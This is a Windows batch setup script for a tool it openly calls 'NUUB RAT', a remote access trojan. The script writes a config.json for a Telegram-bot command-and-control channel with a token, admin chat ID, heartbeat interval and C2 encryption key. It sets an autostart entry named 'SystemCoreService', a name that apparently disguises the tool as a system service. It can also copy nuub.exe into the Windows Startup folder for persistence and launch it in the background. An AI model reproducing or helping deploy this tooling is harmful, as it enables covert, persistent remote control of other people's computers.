@echo off
title NUUB RAT - Quick Setup
color 0A

echo.
echo  _   _ _   _  ___ _____    ___  ___   _   _  _____
echo ^| ^| ^| ^| \ ^| ^|/ _ \_   _^|  / _ \^|_ _^| \ ^| ^|/ / _ \
echo ^| ^| ^| ^|  \^| ^| ^| ^| ^|^| ^|   ^| ^| ^| ^|^| ^|^|  \^| ^| ^| ^| ^|
echo ^| ^|_^| ^| ^|\  ^| ^|_^| ^|^| ^|   ^| ^|_^| ^|^| ^|^| ^|\  ^| ^|_^| ^|
echo  \___/^|_^| \_^|\___/ ^|_^|    \___/___^|_^| \_^|\___/
echo.
echo    Quick Setup v2.0
echo.
echo ============================================
echo.

REM Check if config.json already exists
if exist "config.json" (
    echo [WARNING] config.json already exists!
    set /p OVERWRITE="Overwrite? (y/n): "
    if /i not "%OVERWRITE%"=="y" (
        echo Setup cancelled.
        pause
        exit /b
    )
)

REM Get Telegram Bot Token
set /p BOT_TOKEN="Enter Telegram Bot Token: "
if "%BOT_TOKEN%"=="" (
    echo [ERROR] Bot token is required!
    pause
    exit /b 1
)

REM Get Admin Chat ID
set /p ADMIN_ID="Enter your Telegram Chat ID: "
if "%ADMIN_ID%"=="" (
    echo [ERROR] Admin Chat ID is required!
    pause
    exit /b 1
)

REM Get PC Identifier
set /p PC_ID="Enter PC Identifier [PC-001]: "
if "%PC_ID%"=="" set PC_ID=PC-001

REM Get Encryption Password
set /p ENC_PASS="Enter Encryption Password (leave empty for random): "
if "%ENC_PASS%"=="" (
    REM Generate random password
    set ENC_PASS=%RANDOM%%RANDOM%%RANDOM%
)

REM Get Heartbeat Interval
set /p HEARTBEAT="Enter Heartbeat Interval in minutes [30]: "
if "%HEARTBEAT%"=="" set HEARTBEAT=30

REM Create config.json
echo Creating config.json...
(
echo {
echo     "telegram_bot_token": "%BOT_TOKEN%",
echo     "admin_chat_id": %ADMIN_ID%,
echo     "admin_chat_ids": [%ADMIN_ID%],
echo     "pc_identifier": "%PC_ID%",
echo     "encryption_password": "%ENC_PASS%",
echo     "master_log_filename": "log_master.txt",
echo     "activity_log_filename": "activity_log.csv",
echo     "auto_start_entry_name": "SystemCoreService",
echo     "log_filename": "nuub.log",
echo     "heartbeat_interval_minutes": %HEARTBEAT%,
echo     "c2_encryption_key": ""
echo }
) > config.json

echo.
echo ============================================
echo.
echo [OK] Configuration saved to config.json!
echo.
echo Summary:
echo   Bot Token: %BOT_TOKEN:~0,10%...
echo   Admin ID:  %ADMIN_ID%
echo   PC ID:     %PC_ID%
echo   Heartbeat: %HEARTBEAT% minutes
echo.
echo ============================================
echo.
echo Next Steps:
echo   1. Place config.json in same folder as nuub.exe
echo   2. Run: nuub.exe
echo   3. Send /start to your bot
echo.

set /p AUTO_START="Add to Windows startup? (y/n): "
if /i "%AUTO_START%"=="y" (
    copy "%~dp0nuub.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\nuub.exe" >nul 2>&1
    if %errorlevel%==0 (
        echo [OK] Added to startup folder
    ) else (
        echo [ERROR] Failed to add to startup
    )
)

set /p RUN_NOW="Run RAT now? (y/n): "
if /i "%RUN_NOW%"=="y" (
    echo Starting NUUB RAT...
    start /b "" "%~dp0nuub.exe"
)

echo.
echo Setup complete!
pause
